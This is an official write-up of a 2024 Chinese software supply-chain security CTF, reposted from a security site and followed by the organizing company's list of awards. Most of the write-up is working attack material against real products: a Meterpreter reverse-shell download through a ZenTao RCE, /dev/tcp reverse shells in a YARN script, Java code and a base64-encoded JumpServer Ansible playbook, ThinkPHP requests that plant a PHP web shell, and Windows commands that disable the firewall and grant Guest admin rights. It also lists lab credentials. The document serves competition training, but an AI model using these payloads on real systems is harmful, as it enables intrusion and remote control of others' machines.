# 2024年软件供应链安全技能竞赛官方WriteUp

> 原文: https://www.ctfiot.com/207510.html
> ID: 207510

9月27日，由中国铁塔股份有限公司、中国电信集团有限公司、中国移动通信集团有限公司、中国联合网络通信集团有限公司联合主办的2024年软件供应链安全技能竞赛在北京圆满落幕。凌武科技提供了竞赛平台、供应链场景设计、现场运维等技术支持内容。

此次竞赛汇集了来自全国企事业单位、机构高校等50支参赛队伍，为帮助各位选手更好的复盘，组委会发布竞赛的官方WriteUp，供大家交流和学习。

**科技有限公司综合渗透

01

场景描述

难度等级：中等

预计时长：6小时

该场景使用3层网络拓扑结构，包含了与企业业务和软件开发应用相关的靶标，涵盖与 Java 网站相关的信息泄露、RCE 漏洞、代码审计、边界突破、密码破解、邮件服务器、数据库漏洞等漏洞。攻击者需要运用信息收集、漏洞扫描、Web 漏洞利用、数据库漏洞利用等攻防手段来完成软件供应链攻击。

02

场景设计

整个靶机网络拓扑设计分为四个主要网段：生产网段、测试网段、开发/运维网段和运营商网段。

生产网段模拟真实业务场景设计了开源禅道项目管理软件，该开源版本存在 RCE 漏洞，选手可通过利用软件漏洞进入禅道后台并进一步进入企业内网。

开发/运维网段模拟部署了持续集成/持续部署（CI/CD）服务器和 VPN 服务，通过版本控制系统和构建服务器，模拟软件的开发、构建和部署流程。

测试网段模拟生产环境的测试服务器，用于软件测试和安全测试，在这个网段设计了三个带有漏洞的测试服务和开源堡垒机。

运营商网段模拟第三方组件和镜像的存储仓库，关注软件供应链中运营商的私有云安全问题和储存服务的安全性问题。

03

解题思路

flag1

禅道v18.0.beta1 RCE漏洞，漏洞利用工具：https://github.com/0xf4n9x/Zentao-Captcha-RCE

msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=local_host LPORT=local_port -f elf > a

python3 -m http.server local_port_2

#下载反弹shell payload
./zentao -c "curl http://local_host:
local_port/a -o /tmp/a" -u http://local_host:
local_port_2#赋予权限./zentao -c "chmod 777 /tmp/a" -u http://target_host:
target_port#执行./zentao -c "/bin/bash /tmp/a" -u http://target_host:
target_port

flag2

cat /www/zentaopms/config/my.php

使用该账号密码，访问禅道后台，通过代理，对禅道主机所在的内网网段进行扫描，发现存在邮箱服务器

admin@mail.yym1ng.com1qazcde3!@#

flag3

#!/usr/bin/env python
import requests
target = 'http://127.0.0.1:
8088/'lhost = '192.168.0.1' # put your local host ip here, and listen at port 9999
url = target + 'ws/v1/cluster/apps/new-application'resp = requests.post(url)app_id = resp.json()['application-id']url = target + 'ws/v1/cluster/apps'data = {    'application-id': app_id,    'application-name': 'get-shell',    'am-container-spec': {        'commands': {            'command': '/bin/bash -i >& /dev/tcp/%s/9999 0>&1' % lhost,        },    },    'application-type': 'YARN',}requests.post(url, json=data)

flag4

ftpwsfxsdfrsaqwczdsa

// hintwindows: 192.168.10.55

flag5

将 openvpn 的 ip 和端口设置为暴露出来的端口，在连接 vpn 后，对 windows 机器的 ip 进行扫描，发现存在向日葵端口

尝试使用向日葵的 rce 漏洞

https://github.com/Mr-xn/sunlogin_rce

reg add "HKLMSYSTEMCurrentControlSetControlTerminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f//开启远程桌面 netsh advfirewall set allprofiles state off//关闭防火墙 net user Guest /active:
yes//启用guest用户 net localgroup administrators Guest /add //加入administrators组 net user guest Admin@123 //修改密码为Admin@123

flag6

yujianxgMZCiP6gfusWj3

flag7

try {            String[] cmd = {"/bin/bash", "-c", "bash -i >& /dev/tcp/124.221.207.31/1234 0>&1"};            Runtime.getRuntime().exec(cmd);        } catch (IOException e) {            e.printStackTrace();        }

flag8

admin123456

flag9

flag10

http://target_url:
port?s=/api/thinkapp/invokefunction&function=call_user_func_array&&vars[0]=file_put_contents&vars[1][]=a.php&vars[1][]=PD9waHAgZXZhbCgkX1BPU1RbY21kXSk7Pz4=http://target_url:
port?s=/api/thinkapp/invokefunction&function=call_user_func_array&&vars[0]=passthru&vars[1][0]=echo YmFzZTY0IC1kIGEucGhwID4gc2hlbGwucGhw |base64 -d|bash

flag11

Java.perform(function() {  Java.choose("java.lang.String", {    onComplete: function() {    },    onMatch: function(instance) {      if(instance){        console.log(instance);        // printStack();       }    }  });});

// 查看所有镜像root@ubuntu:~# proxychains curl -u pineapple:
123qwe2wsxcde3 http://10.10.100.43:
5000/v2/_catalog{"repositories":["flag","myapp","spring-boot-minio","ubuntu"]}

// /etc/docker/daemon.json{        "insecure-registries":["10.10.100.43:
5000"]}

// ~/.docker/config.json{        "auths": {                "http://10.10.100.43:
5000": {                        "auth": "cGluZWFwcGxlOjEyM3F3ZTJ3c3hjZGUz"                }        }}

// /etc/systemd/system/docker.service.d/https-proxy.conf
[Service]Environment="HTTP_PROXY=socks5://xxx.xxx.xxx.xxx:
xxx"

systemctl daemon-reloadsystemctl restart docker

docker pull 10.10.100.43:
5000/spring-boot-minio:
latestdocker pull 10.10.100.43:
5000/flag:
latest
docker run -itd --name flag-test 10.10.100.43:
5000/flag:
latest /bin/bash

flag12

admingygsud7gbskdbbxd3rtqak

flag13

使用 windows 机器中的配置访问 jumpserver，模板注入反弹 shell

三方应用: https://blog.csdn.net/qq_43355651/article/details/137275412

[{     "name": "RCE playbook",     "hosts": "all",     "tasks": [       {         "name": "this runs in Celery container",         "shell": "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIxLjIwNy4zMS8xMjM0IDA+JjE=|base64 -d|bash -i",         "u0064elegate_to": "localhost" } ],     "vars": {     "ansible_u0063onnection": "local"     } }]

flag14

flag15

在 jumpserver 的 /manage/script 路由中，存在模板编辑页面中，可以命令执行

公司荣誉

2021年 CVVD首届车联网漏洞挖掘赛二等奖

2021年 第二届“祥云杯”网络安全大赛总决赛三等奖

2021年 浙江省信息通信行业网络安全技能竞赛个人竞赛二等奖

2021年 浙江省信息通信行业网络安全技能竞赛团体竞赛一等奖

2021年 智能网联汽车安全测评技能大赛智能网联汽车破解悬赏赛三等奖

2022年 首届中国智能网联汽车数据与隐私安全技能大赛最佳数据安全漏洞挖掘奖

2022年 第六届河北师范大学信息安全挑战赛暨HECTF2022优秀技术支持单位

2022年 浙江省信息通信行业网络安全技能竞赛个人竞赛二等奖

2022年 浙江省信息通信行业网络安全技能竞赛团体竞赛一等奖

2022年 中国工业互联网安全大赛（浙江省选拔赛）团体竞赛三等奖

2022年 第二届“之江杯”工业互联网广义功能安全国际精英挑战赛冠军（特等奖）

2022年 第二届“之江杯”工业互联网广义功能安全国际精英挑战赛广义功能安全奖

2023年 “凌武杯”杭州未来科技城网络与信息安全管理员职业技能竞赛优秀承办单位

2023年 浙江省信息通信行业职业技能竞赛（网络与信息安全管理员）个人赛冠军

2023年 浙江省信息通信行业职业技能竞赛（网络与信息安全管理员）团队赛二等奖

2023年 浙江省工业互联网安全竞赛三等奖

2023年 “梦想·中移杯”杭州未来科技城软件系统测试职业技能大赛二等奖

2023年 软件供应链安全竞赛优秀支撑单位

2023年 第七届河北师范大学信息安全挑战赛暨HECTF2023优秀技术支持单位

2023年 第四届电信和互联网行业职业技能竞赛个人赛二等奖

2023年 全国网络与信息安全管理员职工职业技能竞赛一等奖

2023年 “补天杯”破解大赛亚军

2023年 首届“强基杯”数据安全技能竞赛数据安全实战赛道全国二等奖

2023年 首届“强基杯”数据安全技能竞赛复赛华东赛区数据安全实战赛道团队三等奖

2023年 全国行业职业技能竞赛–第二届全国数据安全职业技能竞赛总决赛一等奖

2024年 杭州电子科技大学网络攻防大赛优秀技术支持单位

2024年 第七届西湖论剑·中国杭州网络安全技能大赛创新挑战赛优秀作品奖·B等

2024年 第七届工业信息安全技能大赛全国总决赛三等奖

2024年 GEEKCON “对抗研判 AVSS 挑战赛” 决赛第二名

2024年 “矩阵杯”网络安全大赛国产软硬件检测赛亚军、最佳演示奖，人工智能挑战赛三等奖

2024年 浙江省工业互联网安全竞赛冠军

2024年 浙江省信息通信行业职业技能竞赛（信息安全测试员竞赛）团队赛二等奖、个人赛三等奖

2024年 杭州市网络与信息安全管理员职业技能竞赛冠军

2024年 第二届“天网杯”网络安全大赛安全漏洞挖掘挑战赛三等奖、智能网联汽车安全挑战赛三等奖

杭州凌武科技有限公司是一家专注于网络安全的新兴企业，自主研发了竞赛平台、实训平台、文件追踪平台、攻防演练平台、钓鱼演练平台等多款安全产品，提供专业的渗透测试、漏洞挖掘、安全培训、竞赛支撑等服务，对车联网安全、物联网安全、工控安全等新方向有深入的研究，致力于成为客户信赖的安全伙伴。如果您有以上相关业务的需求，欢迎随时联系我们。

关注我们

联系我们


```
禅道v18.0.beta1 RCE漏洞，漏洞利用工具：https://github.com/0xf4n9x/Zentao-Captcha-RCE
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=local_host LPORT=local_port -f elf > a
python3 -m http.server local_port_2
#下载反弹shell payload
./zentao -c "curl http://local_host:
local_port/a -o /tmp/a" -u http://local_host:
local_port_2#赋予权限./zentao -c "chmod 777 /tmp/a" -u http://target_host:
target_port#执行./zentao -c "/bin/bash /tmp/a" -u http://target_host:
target_port
cat /www/zentaopms/config/my.php
admin@mail.yym1ng.com1qazcde3!@#
#!/usr/bin/env python
import requests
target = 'http://127.0.0.1:
8088/'lhost = '192.168.0.1' # put your local host ip here, and listen at port 9999
url = target + 'ws/v1/cluster/apps/new-application'resp = requests.post(url)app_id = resp.json()['application-id']url = target + 'ws/v1/cluster/apps'data = {    'application-id': app_id,    'application-name': 'get-shell',    'am-container-spec': {        'commands': {            'command': '/bin/bash -i >& /dev/tcp/%s/9999 0>&1' % lhost,        },    },    'application-type': 'YARN',}requests.post(url, json=data)
ftpwsfxsdfrsaqwczdsa
// hintwindows: 192.168.10.55
reg add "HKLMSYSTEMCurrentControlSetControlTerminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f//开启远程桌面 netsh advfirewall set allprofiles state off//关闭防火墙 net user Guest /active:
yes//启用guest用户 net localgroup administrators Guest /add //加入administrators组 net user guest Admin@123 //修改密码为Admin@123
yujianxgMZCiP6gfusWj3
try {            String[] cmd = {"/bin/bash", "-c", "bash -i >& /dev/tcp/124.221.207.31/1234 0>&1"};            Runtime.getRuntime().exec(cmd);        } catch (IOException e) {            e.printStackTrace();        }
admin123456
http://target_url:
port?s=/api/thinkapp/invokefunction&function=call_user_func_array&&vars[0]=file_put_contents&vars[1][]=a.php&vars[1][]=PD9waHAgZXZhbCgkX1BPU1RbY21kXSk7Pz4=http://target_url:
port?s=/api/thinkapp/invokefunction&function=call_user_func_array&&vars[0]=passthru&vars[1][0]=echo YmFzZTY0IC1kIGEucGhwID4gc2hlbGwucGhw |base64 -d|bash
Java.perform(function() {  Java.choose("java.lang.String", {    onComplete: function() {    },    onMatch: function(instance) {      if(instance){        console.log(instance);        // printStack();       }    }  });});
// 查看所有镜像root@ubuntu:~# proxychains curl -u pineapple:
123qwe2wsxcde3 http://10.10.100.43:
5000/v2/_catalog{"repositories":["flag","myapp","spring-boot-minio","ubuntu"]}
// /etc/docker/daemon.json{        "insecure-registries":["10.10.100.43:
5000"]}
// ~/.docker/config.json{        "auths": {                "http://10.10.100.43:
5000": {                        "auth": "cGluZWFwcGxlOjEyM3F3ZTJ3c3hjZGUz"                }        }}
// /etc/systemd/system/docker.service.d/https-proxy.conf
[Service]Environment="HTTP_PROXY=socks5://xxx.xxx.xxx.xxx:
xxx"
systemctl daemon-reloadsystemctl restart docker
docker pull 10.10.100.43:
5000/spring-boot-minio:
latestdocker pull 10.10.100.43:
5000/flag:
latest
docker run -itd --name flag-test 10.10.100.43:
5000/flag:
latest /bin/bash
admingygsud7gbskdbbxd3rtqak
[{     "name": "RCE playbook",     "hosts": "all",     "tasks": [       {         "name": "this runs in Celery container",         "shell": "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIxLjIwNy4zMS8xMjM0IDA+JjE=|base64 -d|bash -i",         "u0064elegate_to": "localhost" } ],     "vars": {     "ansible_u0063onnection": "local"     } }]
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/7-1727704508.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/2-1727704509.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/2-1727704510.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/4-1727704511.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/5-1727704512.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/4-1727704513.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/10-1727704514.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/0-1727704514.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/4-1727704516.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/2-1727704516.png)